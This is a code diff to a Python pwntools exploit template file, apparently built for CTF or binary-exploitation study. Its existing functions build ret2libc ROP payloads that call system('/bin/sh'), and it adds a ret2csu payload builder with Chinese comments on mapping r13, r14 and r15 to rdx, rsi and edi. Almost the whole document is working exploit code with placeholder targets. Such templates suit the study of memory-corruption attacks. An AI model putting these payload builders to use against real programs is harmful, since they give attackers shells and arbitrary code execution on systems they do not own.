@@ -30,7 +30,6 @@ def ret2libc_i386_mannul():
     io.send(payload)
     
 
-
 def ret2libc_amd64_mannual():
     '''
     ret2libc X64架构下 手动写payload
@@ -57,7 +56,8 @@ def ret2libc_amd64_mannual():
     payload += p64(pop_rdi_ret_addr) + p64(str_bin_sh)
     payload += p64(system_addr)
     io.send(payload)
-    
+
+
 def ret2libc_pwntools():
     '''
     ret2libc。
@@ -86,5 +86,34 @@ def ret2libc_pwntools():
     rop.raw(b'xxx')
     rop.call(system_addr, [str_bin_sh])
     io.send(rop.chain())
+
+
+def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
+            r12, r13, r14, r15, rbx=0, rbp=1):
+    """
+    return2csu
+    一般程序找不到pop rdx的gadget，需要利用write或者read函数。
+    这里需要找好r13 r14 r15和rdi rsi rdx之间的对应关系，还要分清是rdi还是edi
+    如果是edi，只能控制低4个字节的内容
+    此处示例为r13---rdx r14---rsi r15---edi
+    """
+    io = process('')
+    cur_elf = ELF('')
+    
+    # ret2csu
+    payload = b'a' * 0x0 # 前面的填充
+    payload += p64(csu_end_addr) # 这个地址一般对应的指令为pop rbx
+    payload += p64(rbx) # 0
+    payload += p64(rbp) # 1
+    payload += p64(r12) # 一般会填func@got，调用函数
+    payload += p64(r13) # 对应的是rdx
+    payload += p64(r14) # 对应的是rsi
+    payload += p64(r15) # 对应的edi
+    payload += p64(csu_start_addr) # 这里对应的指令一般是mov rdx r13
+    payload += 0x38 * b'a' # 栈会被抬高0x38个字节，这里也可以布局rbp的值，用于后续栈迁移等
+    payload += p64(ret_addr) # 调用完csu链后返回的地址，比如main函数地址
+    
+    print("len of payload:{}".format(payload))
+    io.send(payload)
     
     
